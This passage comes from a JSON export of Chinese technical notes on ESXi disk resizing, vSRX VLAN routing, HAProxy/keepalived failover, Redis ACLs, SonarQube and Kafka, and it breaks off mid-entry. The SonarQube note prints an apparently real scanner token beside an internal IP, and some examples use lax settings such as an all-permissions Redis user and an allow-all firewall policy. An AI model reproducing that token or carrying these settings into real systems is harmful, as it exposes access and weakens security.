		"content": "背景\n在 ESXi 調整硬碟大小\n\n但這次是直接將 partition 掛載到 /\n沒有再經過 PV -&gt; VG -&gt; LV 掛載流程\n\n開始\n輸入\nparted\n\n確認新擴增的空間尚未被格式化\n\n[!CAUTION] 注意 !!!\n要被 growpart 的空間絕對不能被格式化，不然會出現「NOCHANGE: partition 2 is size 62908416. it cannot be grown」錯誤\n\n如果發現已經被格式化過了，就刪除該分區，讓他變成未被格式化的狀態，如下圖\n\n增加 partition 空間\ngrowpart /dev/sda 2\n\n用 resize2fs 讓實際掛載在系統根目錄的 /dev/sda2 擴容\nresize2fs /dev/sda2\n\n總結\n如果掛載到系統根目錄的方式沒有使用 LVM 的方式，即透過 PV(Physical Volume) 組成 VG(Volume group)，然後在 VG(Volume group) 裡面建立 LV(Logic volume) 的方法，用上面的方式就可以對特定的 partition 做擴容了，方法相對簡單，但沒有 LVM2(Logic volume manage, version 2) 的加持，未來調整空間就比較受限",
		"tags": [ "note","#linux","#ubuntu","#PV","#LV","VG"]
},

{
		"title": "在 ESXi 以 vSRX 實作單臂路由",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ESXi/在 ESXi 以 vSRX 實作單臂路由/",
		"content": "建立 vsrx 機器\n\n下載與試用 vsrx\nhttps://www.juniper.net/us/en/dm/download-next-gen-vsrx-firewall-trial.html\n\n啟動並登入 vsrx\n新增連接埠群組 test-1\n新增連接埠群組 test-2\n設定 trunk 讓所有封包都走來這個 port-group\n將 trunk port-group 綁到 vSRX\n\n註冊並設定 vlan 到 vSRX\n\n新增一個 VLAN\n\n新增\n\nESXi port-group name: test-1\nVLAN ID: 888\nSubnet：10.10.106.0/24(自行指定)\nGateway：10.10.106.254\n\n新增\n\nESXi port-group name: test-2\nVLAN ID: 123\nSubnet：10.10.107.0/24 (自行指定)\nGateway：10.10.107.254\n\n網路拓樸圖\n\npg-trunk-vsrx VLAN ID 4095\ntest-1 VLAN ID 888\ntest-2 VLAN ID 123\n\n開始設定 vSRX\n\n輸入 root 登入\n並輸入 cli 進入 cli 模式\n\n檢查目前 interface 狀態\n指令解釋\n\nset interfaces ge-0/0/0 unit 888 vlan-id 888 family inet address 10.10.106.254/24\n\nset interfaces\n功能：設定網路介面（interface）。\n簡單說，就是告訴 Juniper「我要修改或新增一個網路介面設定」。\n\nge-0/0/0\n功能：指定要設定的實體介面。\nge = Gigabit Ethernet（千兆以太網）\n0/0/0 = Slot / PIC / Port（Juniper 介面的命名方式）\n簡單說，就是選定一塊實體網卡。\n\nunit 888\n功能：指定子介面（sub-interface）的編號。\nJuniper 允許一個實體介面拆成多個子介面，用於不同 VLAN。\n這裡 unit 888 就是給這個子介面編號為 888。\n\nvlan-id 888\n功能：指定這個子介面對應的 VLAN ID。\nVLAN 888 的流量會走到這個子介面上。\n換句話說，這個子介面屬於 VLAN 888，這個值對應到的是 ESXi 裡的 port-group 定義的 VLAN ID。\n\nfamily inet\n功能：指定 IP 層類型，這裡是 IPv4。\nJuniper 的介面可以同時支援多種協議（例如 IPv4, IPv6, MPLS），用 family 來區分。\n這裡的 family inet 就是 IPv4。\n如果你要用 IPv6，就會寫成 family inet6。\nfamily = 協議類型\ninet = IPv4\ninet6 = IPv6\n\naddress 10.10.106.254/24\n功能：設定這個子介面的 IP 位址及子網路遮罩。\n10.10.106.254 = IP\n/24 = 子網路遮罩 255.255.255.0\n這個 IP 就是 VLAN 888 的 Layer 3 閘道（gateway）或 VM 要配發的 IP 網段。\n\n設定 root 帳戶權限\n\nset system root-authentication plain-text-password\n\n開始設定 VLAN\n\n進入設定模式：\n# 1. 啟動 Tagging\nset interfaces ge-0/0/0 vlan-tagging\n\n# 2. 定義 Subinterfaces (L3)\nset interfaces ge-0/0/0 unit 888 vlan-id 888 family inet address 10.10.106.254/24\nset interfaces ge-0/0/0 unit 123 vlan-id 123 family inet address 10.10.107.254/24\n\n# 3. 安全區域設定 (允許介面通訊與 Ping 自機)\nset security zones security-zone trust interfaces ge-0/0/0.888 host-inbound-traffic system-services ping\nset security zones security-zone trust interfaces ge-0/0/0.123 host-inbound-traffic system-services ping\n\n# 4. 預設全開 Policy (Trust to Trust)\nset security policies from-zone trust to-zone trust policy allow-all match source-address any destination-address any application any\nset security policies from-zone trust to-zone trust policy allow-all then permit\n\ncommit\n\n輸入\nshow interfaces ge-0/0/0\n\nvlan 888 與 vlan 123 已設定完成\n\n下一步\n\n依以下步驟建立兩台 VM，\n<a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/ESXi/建立虛擬機器並綁定 VLAN/\">建立虛擬機器並綁定 VLAN</a>\nVM1 :\n\nVM name: test-1\nVLAN ID: 888\nAddress: 10.10.106.1/32\nSubnet：10.10.106.0/24\nGateway：10.10.106.254\n\nVM2 :\n\nVM name: test-2\nVLAN ID: 123\nAddress: 10.10.107.1/32\nSubnet：10.10.107.0/24\nGateway：10.10.107.254\n依序填入下列資訊\n\nvSRX 設定檢查\n\n檢查機器是否有廣播 ARP\n輸入\nshow arp\n\n兩台新建立的機器已經開始廣播 ARP 了\n查看 vSRX interface 設定\n輸入\nshow configuration interfaces\n\n檢查 security zone\n輸入\nshow security zones\n\n測試路由狀況\n\n從 test-1 ping 到 test-2 (ping OK)\n\n從 test-2 ping 到 test-1 (ping OK)\n\n暫停 vSRX 後測試 (ping 不通)\n\n兩台 VM 無法互通\n恢復 vSRX 後測試 (ping OK)\n\n測試 80 port\ntest-2 -&gt; test-1(port 80 OK)\n\ntest-1 -&gt; test-2(port 80 OK)\n\n總結\n\n透過在 ESXi 上建立 VLAN 連接埠群組，並在 vSRX 上設定對應的子介面與 VLAN ID，可以成功實現單臂路由，讓不同 VLAN 的虛擬機器能夠互相通訊。",
		"tags": [ "note","vsrx","ESXi"]
},

{
		"title": "建立虛擬機器並綁定 VLAN",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ESXi/建立虛擬機器並綁定 VLAN/",
		"content": "建立虛擬機器\n\n選取建立類型\n選取名稱和客體作業系統\n選取儲存區\n設定網路介面卡\n下一頁\n完成",
		"tags": [ "note"]
},

{
		"title": "從現有的 ESXi 匯出 VM",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/ESXi/從現有的 ESXi 匯出 VM/",
		"content": "從現有的 ESXi 匯出 VM\n\n從原本的 ESXi 匯出\n匯出後會有兩個檔案\n在另一台 ESXi 建立虛擬機器\n從 OVF 建立\n將 ovf 與 vmdk 上傳\n設定儲存區\n調整網路對應與磁碟佈建\n完成",
		"tags": [ "note","ESXi"]
},

{
		"title": "HA proxy VRRP 研究",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Proxy/HA proxy VRRP 研究/",
		"content": "#haproxy #vrrp #linux #keepalived #proxy\nVRRP(Virtual Router Redundancy Protocol)\n主要實現工具是 keepalived，他會透過 vrrp 廣播 master 的心跳，一但 master 死掉，Backup 就會代替 Master 回覆指定 IP 的 arp request。\n兩台主機上都有 HA Proxy，接收到請求後會再傳到後端 server\n架構圖\n\n參考教學 : https://medium.com/@abhilashkulkarni340/vrrp-and-4-simple-steps-to-set-it-up-on-ubuntu-454c46abb3b4\n安裝\nhaproxy\n$ sudo apt install haproxy\n$ haproxy -v\nHA-Proxy version 2.0.33-0ubuntu0.1 2023/10/31 - https://haproxy.org/\n\nkeepalived\n$ apt-get install keepalived\n$ systemctl status keepalived\n● keepalived.service - Keepalive Daemon (LVS and VRRP)\nLoaded: loaded (/lib/systemd/system/keepalived.service; enabled; vendor preset: enabled)\nActive: inactive (dead)\nCondition: start condition failed at Thu 2024-11-21 13:47:53 CST; 2h 11min ago\n\nNov 21 13:47:53 jason-2 systemd[1]: Condition check resulted in Keepalive Daemon (LVS and VRRP) being skipped.\n\n出現 inactive 是正常的，因為沒有 keepalived 的設定檔\n所以要從 keepalived config sample 裡面拿到範例設定檔\n$ cp /usr/share/doc/keepalived/samples/keepalived.conf.sample /etc/keepalived/keepalived.conf\n\nVRRP 主備切換環境\n\n設定檔\njason-1(Master)、jason-2(Backup) 兩台測試機的設定檔都要放\njason-1(Master)\n/etc/haproxyhaproxy.cfg\nglobal\n\tlog /dev/log\tlocal0\n\tlog /dev/log\tlocal1 notice\n\tchroot /var/lib/haproxy\n\tstats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners\n\tstats timeout 30s\n\tuser haproxy\n\tgroup haproxy\n\tdaemon\n\n\t# Default SSL material locations\n\tca-base /etc/ssl/certs\n\tcrt-base /etc/ssl/private\n\n\t# See: https://ssl-config.mozilla.org/#server=haproxy&amp;server-version=2.0.3&amp;config=intermediate\nssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384\nssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256\nssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets\n\ndefaults\n\tlog\tglobal\n\tmode\thttp\n\toption\thttplog\n\toption\tdontlognull\ntimeout connect 5000\ntimeout client 50000\ntimeout server 50000\n\terrorfile 400 /etc/haproxy/errors/400.http\n\terrorfile 403 /etc/haproxy/errors/403.http\n\terrorfile 408 /etc/haproxy/errors/408.http\n\terrorfile 500 /etc/haproxy/errors/500.http\n\terrorfile 502 /etc/haproxy/errors/502.http\n\terrorfile 503 /etc/haproxy/errors/503.http\n\terrorfile 504 /etc/haproxy/errors/504.http\n\nfrontend firstbalance\nbind *:80\noption forwardfor\ndefault_backend webservers\n\nbackend webservers\nbalance roundrobin\nserver test-2 10.xx.x.154:8080 check &lt;-- 這個要指定後端 server 位置\n\n/etc/keepalived/keepalived.conf\n! Configuration File for keepalived\n\nglobal_defs {\nrouter_id LVS_DEVEL\n}\n\nvrrp_instance VI_1 {\nstate MASTER # 路由器的首選狀態 - MASTER 或 BACKUP\ninterface ens160 # IP 位址綁定的介面。它還必須添加到 virtual_ipaddress 部分\nunicast_src_ip 10.xx.x.153 # 目前路由器的IP位址\nunicast_peer{\n10.xx.x.154 # VRRP中其他路由器的IP位址\n}\nvirtual_router_id 50\n# nopreempt # nopreempt允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。\npriority 101 # 優先權：該路由器在其他路由器中的優先權\nadvert_int 1\nvirtual_ipaddress {\n\t 10.xx.x.160 # 此部分用於新增虛擬 IP 位址 (VIP)。請注意它如何與 src_ip 和對等點位於同一網路中。\n}\n}\n\njason-2(Backup)\n/etc/haproxyhaproxy.cfg\nglobal\n\tlog /dev/log\tlocal0\n\tlog /dev/log\tlocal1 notice\n\tchroot /var/lib/haproxy\n\tstats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners\n\tstats timeout 30s\n\tuser haproxy\n\tgroup haproxy\n\tdaemon\n\n\t# Default SSL material locations\n\tca-base /etc/ssl/certs\n\tcrt-base /etc/ssl/private\n\n\t# See: https://ssl-config.mozilla.org/#server=haproxy&amp;server-version=2.0.3&amp;config=intermediate\nssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384\nssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256\nssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets\n\ndefaults\n\tlog\tglobal\n\tmode\thttp\n\toption\thttplog\n\toption\tdontlognull\ntimeout connect 5000\ntimeout client 50000\ntimeout server 50000\n\terrorfile 400 /etc/haproxy/errors/400.http\n\terrorfile 403 /etc/haproxy/errors/403.http\n\terrorfile 408 /etc/haproxy/errors/408.http\n\terrorfile 500 /etc/haproxy/errors/500.http\n\terrorfile 502 /etc/haproxy/errors/502.http\n\terrorfile 503 /etc/haproxy/errors/503.http\n\terrorfile 504 /etc/haproxy/errors/504.http\nfrontend firstbalance\nbind *:80\noption forwardfor\ndefault_backend webservers\n\nbackend webservers\nserver test-2 172.xx.x.1:8080 check\n# option httpchk\n\n/etc/keepalived/keepalived.conf\n! Configuration File for keepalived\n\nglobal_defs {\nrouter_id LVS_DEVEL\n}\nvrrp_instance VI_1 {\ninterface ens160\nstate BACKUP\nunicast_src_ip 10.xx.x.154\nunicast_peer{\n10.xx.x.153\n}\nvirtual_router_id 50\n# nopreempt\npriority 101\nadvert_int 1\nvirtual_ipaddress {\n\t 10.xx.x.160\n}\n}\n\n[!TIP] Tip: nopreempt\n允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。\n發生情境:\n其中一台設置為master，一台設置為backup。 當master出現異常后，backup自動切換為master。 當backup成為master后，master恢復正常后會再次搶佔成為master，導致不必要的主備切換。 因此可以將兩台keepalived初始狀態均配置為backup，設置不同的優先順序，優先順序高的設置nopreempt解決異常恢復后再次搶佔的問題。\n\n執行\njason-1(Master)\n$ sudo systemctl restart keepalived\n\njason-2(Backup)\n$ sudo systemctl restart keepalived\n\njason-2 這台目前是 BACKUP mode\n\n實驗\n目前狀態\njason-1 - Master\njason-2 - Backup\n\njason-3 觀測機\narp table 測試\n$ sudo arping 10.xx.x.160\n60 bytes from 00:xx:xx:xx:xx:88 (10.xx.x.160): index=1 time=517.786 usec\n\n現在 10.xx.x.160 是 jason-1(00:xx:xx:xx:88) 所負責的\n\n查看 arp table\n$ arp -a\n...\n? (10.xx.x.160) at 00:xx:xx:xx:xx:88 [ether] on ens160\n...\n\n關閉 jason-1(Master)\nsudo systemctl stop keepalived\n\n發現 jason-2(Backup) 主機接手 Master 位置\n\n到 jason-3 探測機，發現已經迅速切換主備位置了\n\narp table 也同步更新\n\n服務也未中斷\n\nVRRP工作原理\nref: https://info.support.huawei.com/info-finder/encyclopedia/zh/VRRP.html\n當Master設備出現故障時，路由器B和路由器C會選舉出新的Master設備。 新的Master設備開始回應對虛擬IP位址的ARP回應，並定期發送VRRP通告報文。\nVRRP的詳細工作過程如下：\n\nVRRP備份組中的設備根據優先順序選舉出Master。 Master設備通過發送免費ARP報文，將虛擬MAC位址通知給與它連接的設備或者主機，從而承擔報文轉發任務。\nMaster設備週期性向備份組內所有Backup設備發送VRRP通告報文，通告其配置資訊（優先順序等）和工作狀況。\n如果Master設備出現故障，VRRP備份組中的Backup設備將根據優先順序重新選舉新的Master。\nVRRP備份組狀態切換時，Master設備由一台設備切換為另外一台設備，新的Master設備會立即發送攜帶虛擬路由器的虛擬MAC位址和虛擬IP位址資訊的免費ARP報文，刷新與它連接的設備或者主機的MAC表項，從而把使用者流量引到新的Master設備上來，整個過程對使用者完全透明。\n原Master設備故障恢復時，若該設備為IP位址擁有者（優先順序為255），將直接切換至Master狀態。 若該設備優先順序小於255，將首先切換至Backup狀態，且其優先順序恢復為故障前配置的優先順序。\nBackup設備的優先順序高於Master設備時，由Backup設備的工作方式（搶佔方式和非搶佔方式）決定是否重新選舉Master。",
		"tags": ["haproxy", "vrrp", "linux", "keepalived", "proxy", "note","vrrp","haproxy"]
},

{
		"title": "Redis ACL 持久化",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Redis/Redis ACL 持久化/",
		"content": "主旨\n因為在 <a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/Redis/Redis stream 訂閱權限設定/\">Redis stream 訂閱權限設定</a> 時，無法 acl save\n\n故需要設定 aclfile 才能儲存 redis acl 設定\n環境準備\n\n建立 redis\n\ndocker compose\nversion: &quot;3.9&quot;\nservices:\nredis:\nimage: redis:7.2 # Redis 7+ 才支援 ACL 持久化\ncontainer_name: redis_acl\nports:\n- &quot;6379:6379&quot;\nvolumes:\n- ./redis-data:/data # 資料持久化\n- ./redis-acl.conf:/usr/local/etc/redis/redis-acl.conf:ro # 自訂 ACL config\ncommand: [&quot;redis-server&quot;, &quot;/usr/local/etc/redis/redis-acl.conf&quot;]\n\n建立 redis-acl.conf 與 acl 設定檔\ntouch redis-acl.conf\nmkdir -p ./redis-data\ntouch ./redis-data/users.acl\n\n在 redis-acl.conf 填入以下內容\n# redis-acl.conf\nbind 0.0.0.0\nport 6379\n\n# 指定 ACL file\naclfile /data/users.acl\n\n資料夾結構\n.\n├── docker-compose.yml\n├── redis-acl.conf\n└── redis-data\n└── users.acl\n\n2 directories, 3 files\n\n啟動 redis\ndocker compose up -d\n\n連線到 redis\nredis-cli\n\n建立 Redis user\n此使用者只能訂閱 mystream (承 <a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/Redis/Redis stream 訂閱權限設定/\">Redis stream 訂閱權限設定</a>)\nACL SETUSER stream_user on &gt;YOUR_PASSWORD +XREAD +XREADGROUP +XRANGE +XINFO ~mystream\n\n儲存 ACL 設定\nacl save\n\n重新啟動 redis\ndocker compose down -v &amp;&amp; docker compose up -d\n\n登入剛建立的 ACL 帳戶\n$ redis-cli\n127.0.0.1:6379&gt; auth stream_user YOUR_PASSWORD\nOK\n127.0.0.1:6379&gt;\n\nstream_user 有持久化保存\n\n測試未 acl save 就退出的情況\n\noptional - 預定義 user\n\n編輯 /redis-data/users.acl，加入預設使用者：\nuser stream_user2 on &gt;mypassword ~* +@all\n\n啟動 redis 後也能看到剛剛設定的 stream_user2\n\n結語\n透過 acl save 可以將 redis-cli session 期間建立的 user 持久化保存，也能透過預先定義的 user.acl 建立 user",
		"tags": [ "note","Redis","acl"]
},

{
		"title": "Redis stream 訂閱權限設定",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Redis/Redis stream 訂閱權限設定/",
		"content": "Redis ACL\nhttps://redis.io/docs/latest/operate/oss_and_stack/management/security/acl/\n建立 Stream\nRedis Stream 是「lazy creation」，也就是只要你往一個 key 寫入資料，它就會自動建立。\n建立一個名為 mystream 的 Stream\nXADD mystream * message &quot;Hello World&quot;\n\n* → 自動生成 ID（timestamp-based）\nmessage &quot;Hello World&quot; → 欄位與值，可以一次放多個欄位\n執行後，mystream 就存在了。\n\n列出所有 stream channel\nSCAN 0 TYPE stream\n\n建立只能訂閱 mystream 的使用者\n語法如下\nACL SETUSER stream_user on &gt;StrongPassword +XREAD +XREADGROUP +XRANGE +XINFO ~{{YOUR_STREAM_NAME}}\n\nexample:\nACL SETUSER stream_user on &gt;YOUR_PASSWORD +XREAD +XREADGROUP +XRANGE +XINFO ~mystream\n\n[!NOTE]\nstream_user → 新使用者名稱\non → 啟用帳號\nYOUR_PASSWORD → 密碼\n+XREAD +XREADGROUP +XRANGE +XINFO → 允許讀取 Stream 的命令\n~my-stream → 只允許存取這個 key，其他 Stream key 都不能存取。\n\n使用受 ACL 權限控管的使用者連線到 Redis\nredis-cli -u redis://stream_user:YOUR_PASSWORD@127.0.0.1:6379\n\n連線後只要操作 my-stream 可以成功，其他 Stream key 會出現權限錯誤：\nXREAD COUNT 1 STREAMS mystream 0 # 成功 XREAD COUNT 1\nSTREAMS other-stream 0 # 失敗 -&gt; No Permissions to access a key\n\n最後記得 acl save 持久化保存\n如何做 ACL 持久化請參閱\n<a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/Redis/Redis ACL 持久化/\">Redis ACL 持久化</a>",
		"tags": [ "note","Redis","redis-stream","auth","acl"]
},

{
		"title": "SRX 配置 Default gateway",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/SRX/SRX 配置 Default gateway/",
		"content": "目前環境前面有一個 Fortigate\n所以先檢查 routing-table 的狀態\nget router info routing-table all\n...\nRouting table for VRF=0\nS* 0.0.0.0/0 [10/0] via 10.6x.1.1, wanlink, [1/0]\n...\nC 10.7x.1x.0/24 is directly connected, my_esxi\n...\nFGT60F #\n\n檢查 SRX 上的自動收到 arp 封包產生的 arp table\nroot&gt; show arp no-resolve\nMAC Address Address Interface Flags\n0x:x5:x0:ax:ex:xx 10.7x.1x.254 fe-0/0/7.0 none\n\nroot&gt;\n\n要配置在 SRX 上的 default gateway 就會是 10.7x.1x.254，靜態 IP 就要在 10.7x.1x.25/24 裡面挑一個 IP\n下一步\n\n配置一個 route 規則\n詳見 <a class=\"internal-link is-unresolved\" href=\"/404\" target=\"\">SRX 上網設定</a>",
		"tags": [ "note"]
},

{
		"title": "重置 SRX",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/SRX/重置 SRX/",
		"content": "進入 cli\nroot@% cli\nroot&gt;\n\n進入 configuration mode\nroot&gt; configure\nEntering configuration mode\nThe configuration has been changed but not committed\n\n[edit]\nroot#\n\n輸入 delete，並回答 yes\nroot# delete\nThis will delete the entire configuration\nDelete everything under this level? [yes,no] (no) yes\n\n[edit]\nroot#\n\n重設 root 帳號密碼\nroot# set system root-authentication plain-text-password\nNew password:\nRetype new password:\n\n[edit]\nroot#\n\n輸入 commit 提交變更\nroot# commit\ncommit complete\n\n[edit]\nroot#\n\n輸入 exit 離開 config 模式\nroot# exit\nExiting configuration mode\n\nroot&gt;",
		"tags": [ "note"]
},

{
		"title": "SonarQube 靜態程式碼檢查工具",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/SonarQube 靜態程式碼檢查工具/",
		"content": "簡介\nSonarQube\n屬於 SAST(Static Application Security Testing) 工具，會做為程式品質的守門員，內含 js、python、lua 等代碼風格規則集。\ndeepfence\n使用 Deepfence 做 DAST(Dynamic Application Security Testing) 監控，目的是讓線上服務的進出流量都受到 OWASP 安全掃描，最終掃描結果會放到主控台\nSDLC\n\nDAST\nhttps://community.deepfence.io/threatmapper/docs/installation/\n\nFirewall\n\nEntity\nPort\ndirection\n\nSonarQube Server\n9000\ninbound\n\n使用平台\nSonarQube\n這次使用的平台定位在 test 之後要 release 之前\nhttps://docs.sonarsource.com/sonarqube-community-build/\n\n後台管理頁面\ndocker run -d --name sonarqube -p 9000:9000 -p 9092:9092 sonarqube\n\n建立 project key\nhttps://docs.sonarsource.com/sonarqube-server/latest/analyzing-source-code/scanners/sonarscanner/#configuring-your-project\n在欲掃描的資料夾底下建立 sonar-project.properties\n$ touch sonar-project.properties\n\n填入 project key\n# must be unique in a given SonarQube Server instance\nsonar.projectKey=my:project\n\n產出 token\n\n取得 project key、token\n\n帶入環境變數進行程式碼掃描\ndocker run \\\n--rm \\\n-e SONAR_HOST_URL=&quot;http://10.66.16.108:9000&quot; \\\n-e SONAR_TOKEN=sqp_4e22abc134b4d52b9fe654b7d549427abb71db90 \\\n-v &quot;$(pwd)/:/usr/src&quot; \\\nsonarsource/sonar-scanner-cli\n\n掃描結果",
		"tags": [ "note","#DevSecOps"]
},

{
		"title": "Consumer offset reset 行為",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Consumer offset reset 行為/",
		"content": "情境\n\nconsumer 預期會從 kafka 持續讀取 log，但如果 consumer crash，kafka 會保存 commited offset 7 天\n也說明，若 consumer 停機超過 7 天，之前消費的位置將會被重置\n參數\n\nauto.offset.reset=latest: 會從 kafka topic 最末端讀取 log\nauto.offset.reset=earliest: 從最早的地方開始讀 log\nauto.offset.reset=none: 若沒有 offset 資訊，將會拋出 exception\n\n重播 log 給 consumer\n\n步驟如下:\n\n關閉該 consumer group 底下所有的 consumer\n使用 kafka-consumer-groups 重置你想重置的 offset 位置\n重啟 consumer\n\nJava code\n透過 addShutdownHook 偵測 shutdown event\n...\n// get a reference\nfinal Thread mainThread = Thread.currentThread();\n\nRuntime.getRuntime().addShutdownHook(new Thread(){\npublic void run(){\nlog.info(&quot;Detected a shutdown event&quot;);\nconsumer.wakeup();\n\ntry {\nmainThread.join();\n} catch (InterruptedException e) {\ne.printStackTrace();\n}\n}\n});\n...\ntry(openSearchClient; consumer){\nboolean indexExists = openSearchClient.indices().exists(new GetIndexRequest(indexName), RequestOptions.DEFAULT);\nif (!indexExists){\n// we need to create the index on opensearch if it doesn't exist already\nCreateIndexRequest createIndexRequest = new CreateIndexRequest(indexName);\nopenSearchClient.indices().create(createIndexRequest, RequestOptions.DEFAULT);\nlog.info(&quot;The wikimedia index has been created&quot;);\n} else {\nlog.info(&quot;The wikimedia index already exists&quot;);\n}\n\nwhile (true){\nConsumerRecords&lt;String, String&gt; records = consumer.poll(Duration.ofMillis(3000));\n\nint recordCount = records.count();\nlog.info(&quot;Received &quot; + recordCount + &quot; record(s)&quot;);\nBulkRequest bulkRequest = new BulkRequest();\nfor (ConsumerRecord&lt;String, String&gt; record : records){\ntry{\nString id = extractId(record.value());\n// send the record into opensearch\nIndexRequest indexRequest = new IndexRequest(indexName)\n.source(record.value(), XContentType.JSON)\n.id(id);\n//IndexResponse indexResponse = openSearchClient.index(indexRequest, RequestOptions.DEFAULT);\nbulkRequest.add(indexRequest);\n} catch (Exception e){\n\n}\n}\nif (bulkRequest.numberOfActions() &gt; 0){\nBulkResponse bulkResponse = openSearchClient.bulk(bulkRequest, RequestOptions.DEFAULT);\nlog.info(&quot;Inserted &quot; + bulkResponse.getItems().length + &quot; record(s).&quot;);\ntry {\nThread.sleep(1000);\n} catch (InterruptedException e) {\ne.printStackTrace();\n}\n\n}\n\nconsumer.commitAsync();\nlog.info(&quot;offset have been committed!&quot;);\n}\n} catch (WakeupException e){\nlog.info(&quot;Consumer is starting to shutdown&quot;);\n} catch (Exception e){\nlog.error(&quot;unexpected exception: &quot;, e);\n} finally {\nconsumer.close(); // close the consumer, this will also commit offest to kafka.\nopenSearchClient.close();\nlog.info(&quot;The consumer is now gracefully shut down&quot;);\n}",
		"tags": [ "note","kafka","java"]
},

{
		"title": "Kafka Topic Availability",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka Topic Availability/",
		"content": "Producer ACK 機制說明\n\nACK = 0\n\nCase: 發送速度最快，但資料丟失風險最大\n只要發送成功就繼續發送下一筆\n\nACK = 1\n\nCase: 剛剛好的發送速度，適合日常一般資料使用，有部分資料丟失風險\nLeader Partition 回傳 ACK 就算成功\n\nACK = all (搭配)\n\nCase: 希望資料不要丟失，可以考慮這個設置\n需要 Partition 副本組內指定 min.insync.replicas 數量的 replica ACK，訊息才會 ACK\n\nmin.insync.replicas = 1 -&gt; Leader ACK 就成功\nmin.insync.replicas = 2 -&gt; Leader + replica 兩個 ACK 就成功",
		"tags": [ "note","kafka"]
},

{
		"title": "Kafka consumer group 與 rebalance 機制",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Kafka consumer group 與 rebalance 機制/",
		"content": "Topic 可以切分多個 Partition\n\n一個 consumer 可以訂閱多個 Partition\n\n每個 consumer 都可以訂閱 Topic 內所有的 partition\n\n多個 Consumer 可以組成一個 Consumer group\n\n同個 Consumer group 內共享 Topic 內所有的 Partition\n一個 consumer 就會訂閱所有的 Partition\n\n兩個 consumer 分散訂閱 Partition\n\n三個 consumer 就會一個 consumer 訂閱一個 partition，均分所有的 Partition\n\n若 consumer 數量 &gt; Partition 數量，多餘的 Consumer 就會 Disable\n\n以 UI 介面為例\nConsumer group: my-java-application\n\n訂閱了一個 Topic，並且擁有兩個 Member\n\n並且從 Assigned partitions 可以得知，總共有三個 Partition\nclient id 為 b52ac033-cf4b-49d2-8a13-78ea6b4e1cf1 的 consumer 分到 1 個 partition\nclient id 為 5545bc61-e3fd-4f2f-a0d7-fc7d77d1ddcc 的 consumer 分到 2 個 partition\n\n查詢 consumer group 裡面的 member 目前訂閱哪個 Topic，與每個 member 訂閱的 Partition 有哪些\n$ kafka-consumer-groups --bootstrap-server localhost:19092 --group my-java-application --describe\n\n案例實作\nTopic: demo_java\nPartition: 3\n$ kafka-topics.sh --bootstrap-server localhost:19092 --topic demo_java --describe\n\nCase 1: 只有一個訂閱者\nCONSUMER-ID: consumer-my-java-application-1-c478a360-25f4-4cd8-8a13-158f0b960d71 (訂閱三個 partition)\n\nCase 2: 兩個訂閱者\nconsumer-my-java-application-1-a2c4de74-999b-4898-a0e3-b2f165a37a75 訂閱 id: 0,1 partition\nconsumer-my-java-application-1-c478a360-25f4-4cd8-8a13-158f0b960d71 訂閱 id: 2 partition\n\nCase 3: 三個訂閱者(一個 Partition 對應一個 consumer)\n\nCase 4: 四個訂閱者(訂閱者數量 &gt; Partition 數量)\nConsumer 0 未被分配到任一個 Partition\n\nRebalance 機制\n每次 Rebalance 都需要 Broker 參與，但不是每台 Broker 都需要參與 Rebalance 的行為，只有 Coordinator Broker 才需要\n透過以下指令查詢 Coordinator Broker\n$ kafka-consumer-groups.sh --bootstrap-server localhost:19092 --group my-java-application --describe --state\n\n以這次案例來說，group: my-java-application 的 Coordinator Broker 是 localhost:19092\n觀察每次新建 consumer 都會產出的 Log\nRequest joining group due to: group is already rebalancing\nRevoke previously assigned partitions demo_java-1\n\n(Re-)joining group\n\nSuccessfully joined group with generation Generation{generationId=34, 